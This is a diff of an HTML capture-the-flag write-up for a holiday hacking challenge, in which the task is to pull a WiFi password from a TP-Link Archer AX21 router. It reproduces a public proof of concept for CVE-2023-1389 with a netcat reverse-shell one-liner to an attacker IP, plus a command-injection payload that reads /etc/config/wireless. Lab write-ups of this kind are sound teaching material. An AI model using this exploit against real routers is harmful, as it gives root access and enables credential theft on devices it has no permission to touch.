@@ -18,14 +18,12 @@ nav: |
 <thead>
 <tr>
 <th>Objective: Dosis Network Down</th>
-<br>
 <th>Difficulty Level: 2</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Drop by JJ's 24-7 for a network rescue and help restore the holiday cheer.<br> What is the WiFi password found in the router's config?</td>
-<br>
 <td>Location: JJ's 24-7</td>
 </tr>
 </tbody>
@@ -39,76 +37,52 @@ The objective is to gain access to the router configuration and the password it 
 <thead>
 <tr>
 <th>Activity</th>
-<br>
 <th>Primary Tactic</th>
-<br>
 <th>MITRE ATT&CK Technique ID</th>
-<br>
 <th>MITRE ATT&CK Technique Name</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Identify vulnerable TP-Link Archer AX21 router running outdated firmware</td>
-<br>
 <td>Reconnaissance</td>
-<br>
 <td>T1595.002</td>
-<br>
 <td>Active Scanning: Vulnerability Scanning</td>
 </tr>
 <tr>
 <td>Access the router's web management interface without authentication</td>
-<br>
 <td>Initial Access</td>
-<br>
 <td>T1190</td>
-<br>
 <td>Exploit Public-Facing Application</td>
 </tr>
 <tr>
 <td>Craft malicious GET request with command injection payload in country parameter</td>
-<br>
 <td>Execution</td>
-<br>
 <td>T1059.004</td>
-<br>
 <td>Command and Scripting Interpreter: Unix Shell</td>
 </tr>
 <tr>
 <td>Send request twice to <code>/cgi-bin/luci;stok=/locale</code> endpoint to set and execute command</td>
-<br>
 <td>Execution</td>
-<br>
 <td>T1203</td>
-<br>
 <td>Exploitation for Client Execution</td>
 </tr>
 <tr>
 <td>Execute injected commands with root privileges via <code>popen()</code> function</td>
-<br>
 <td>Privilege Escalation</td>
-<br>
 <td>T1068</td>
-<br>
 <td>Exploitation for Privilege Escalation</td>
 </tr>
 <tr>
 <td>Read <code>/etc/config/wireless</code> configuration file containing network credentials</td>
-<br>
 <td>Credential Access</td>
-<br>
 <td>T1552.001</td>
-<br>
 <td>Unsecured Credentials: Credentials In Files</td>
 </tr>
 <tr>
 <td>Extract WiFi password (SprinklesAndPackets2025!) from wireless configuration</td>
-<br>
 <td>Collection</td>
-<br>
 <td>T1005</td>
-<br>
 <td>Data from Local System</td>
 </tr>
 </tbody>
@@ -157,105 +131,64 @@ Exploit Code Analysis
 From exploit-db, the exploit code provides insight into the request structure needed:
 
 <pre><code class="language-python">
-<br>
 #!/usr/bin/python3
-<br>
 #
-<br>
 <h1>Exploit Title: TP-Link Archer AX21 - Unauthenticated Command Injection</h1>
-<br>
 <h1>Date: 07/25/2023</h1>
-<br>
 <h1>Exploit Author: Voyag3r (https://github.com/Voyag3r-Security)</h1>
-<br>
 <h1>Vendor Homepage: https://www.tp-link.com/us/</h1>
-<br>
 <h1>Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219</h1>
-<br>
 <h1>Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0</h1>
-<br>
 <h1>CVE: CVE-2023-1389</h1>
-<br>
 #
-<br>
 <h1>Disclaimer: This script is intended to be used for educational purposes only.</h1>
-<br>
 <h1>Do not run this against any system that you do not have permission to test.</h1>
-<br>
 <h1>The author will not be held responsible for any use or damage caused by this program.</h1>
-<br>
 #
-<br>
 <h1>CVE-2023-1389 is an unauthenticated command injection vulnerability in the web</h1>
-<br>
 <h1>management interface of the TP-Link Archer AX21 (AX1800), specifically, in the</h1>
-<br>
 <h1><em>country</em> parameter of the <em>write</em> callback for the <em>country</em> form at the</h1>
-<br>
 <h1>"/cgi-bin/luci/;stok=/locale" endpoint. By modifying the country parameter it is</h1>
-<br>
 <h1>possible to run commands as root. Execution requires sending the request twice;</h1>
-<br>
 <h1>the first request sets the command in the <em>country</em> value, and the second request</h1>
-<br>
 <h1>(which can be identical or not) executes it.</h1>
-<br>
 #
-<br>
 <h1>This script is a short proof of concept to obtain a reverse shell. To read more</h1>
-<br>
 <h1>about the development of this script, you can read the blog post here:</h1>
-<br>
 <h1>https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94</h1>
-<br>
 <h1>Before running the script, start a nc listener on your preferred port -> run the script -> profit</h1>
 
 import requests, urllib.parse, argparse
-<br>
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 <h1>Suppress warning for connecting to a router with a self-signed certificate</h1>
-<br>
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 <h1>Take user input for the router IP, and attacker IP and port</h1>
-<br>
 parser = argparse.ArgumentParser()
-<br>
 parser.add_argument("-r", "--router", dest = "router", default = "192.168.0.1", help="Router name")
-<br>
 parser.add_argument("-a", "--attacker", dest = "attacker", default = "127.0.0.1", help="Attacker IP")
-<br>
 parser.add_argument("-p", "--port",dest = "port", default = "9999", help="Local port")
-<br>
 args = parser.parse_args()
 
 <h1>Generate the reverse shell command with the attacker IP and port</h1>
-<br>
 revshell = urllib.parse.quote("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + args.attacker + " " + args.port + " >/tmp/f")
 
 <h1>URL to obtain the reverse shell</h1>
-<br>
 url_command = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(" + revshell + ")"
 
 <h1>Send the URL twice to run the command. Sending twice is necessary for the attack</h1>
-<br>
 r = requests.get(url_command, verify=False)
-<br>
 r = requests.get(url_command, verify=False)
-<br>
 </code></pre>
 
 Key portion of the script:
 
 <pre><code class="language-python">
-<br>
 <h1>URL to obtain the reverse shell</h1>
-<br>
 url_command = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(" + revshell + ")"
 
 <h1>Send the URL twice to run the command. Sending twice is necessary for the attack</h1>
-<br>
 </code></pre>
 
 <img src="/HHC_2025/images/dosisnetwork_200.jpg" alt="Testing GET request structure showing 200 OK response">
@@ -269,9 +202,7 @@ On the TP-Link Archer AX21, the file <code>/etc/config/wireless</code> is part o
 The simplest payload is to print the file:
 
 <pre><code class="language-">
-<br>
 $(cat%20/etc/config/wireless)
-<br>
 </code></pre>
 
 <img src="/HHC_2025/images/dosisnetwork_solution.jpg" alt="Payload execution showing wireless configuration file contents">
@@ -286,19 +217,16 @@ $(cat%20/etc/config/wireless)
 <thead>
 <tr>
 <th>Tools Used</th>
-<br>
 <th>Tool Version</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Burp Suite Community Edition</td>
-<br>
 <td>v2024.11.2</td>
 </tr>
 <tr>
 <td>Exploit-db</td>
-<br>
 <td>N/A</td>
 </tr>
 </tbody>
@@ -309,24 +237,20 @@ $(cat%20/etc/config/wireless)
 <thead>
 <tr>
 <th>Provided By</th>
-<br>
 <th>Hint</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Santa</td>
-<br>
 <td>You know...if my memory serves me correctly...there was a lot of fuss going on about a UCI (I forgot the exact term...) for that router.</td>
 </tr>
 <tr>
 <td>Santa</td>
-<br>
 <td>I can't believe nobody created a backup account on our main router...the only thing I can think of is to check the version number of the router to see if there are any...ways around it...</td>
 </tr>
 <tr>
 <td>JJ</td>
-<br>
 <td>Alright then. Those bloody gnomes have proper messed about with the neighborhood's wifi - changed the admin password, probably mucked up all the settings, the lot.Now I can't get online and it's doing me head in, innit? We own this router, so we're just taking back what's ours, yeah? You reckon you can help me hack past whatever chaos these little blighters left behind? What is the WiFi password found in the router's config?</td>
 </tr>
 </tbody>
@@ -337,14 +261,12 @@ $(cat%20/etc/config/wireless)
 <thead>
 <tr>
 <th>Provided By</th>
-<br>
 <th>Notes</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>raffi</td>
-<br>
 <td>directed me to look at the exploit-db poc code carefully</td>
 </tr>
 </tbody>
